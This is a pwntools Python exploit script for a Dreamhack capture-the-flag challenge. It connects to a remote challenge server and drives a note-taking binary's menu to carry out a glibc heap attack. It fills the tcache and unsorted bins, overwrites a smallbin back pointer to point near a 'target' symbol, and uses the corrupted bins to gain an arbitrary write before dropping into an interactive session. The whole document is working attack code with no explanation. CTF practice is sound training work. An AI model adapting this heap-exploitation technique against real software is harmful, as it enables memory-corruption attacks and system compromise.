from pwn import *
import sys

p = remote('host3.dreamhack.games', 23864)
e = ELF('./main')


def create_note(idx, ty):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    if ty == 'tiny':
        p.sendlineafter(b': ', b'1')
    else:
        p.sendlineafter(b': ', b'2')


def delete_note(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())


def edit_note(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', data)


success('1. 7 tcache')
for i in range(0, 7):
    create_note(i, 'small')

success('2. 8 smallbin')
for i in range(7, 15):
    create_note(i, 'small')
    create_note(255, 'tiny')

success('3. fill tcachebin')
for i in range(0, 7):
    delete_note(i)

success('4. fill unsortedbin')
for i in range(7, 15):
    delete_note(i)

success('5. empty tcachebin')
for i in range(0, 7):
    create_note(i, 'small')

success('6. unsortedbin -> smallbin')
create_note(255, 'tiny')

success('7. alter smallbin bck')
edit_note(14, p64(0) + p64(e.symbols['target'] - 0x10))

success('8. smallbin -> tcachebin')
create_note(255, 'small')

success('9. aaw')
create_note(255, 'small')
edit_note(255, b'AAAAAAAA')

p.sendlineafter(b'> ', b'4')
p.interactive()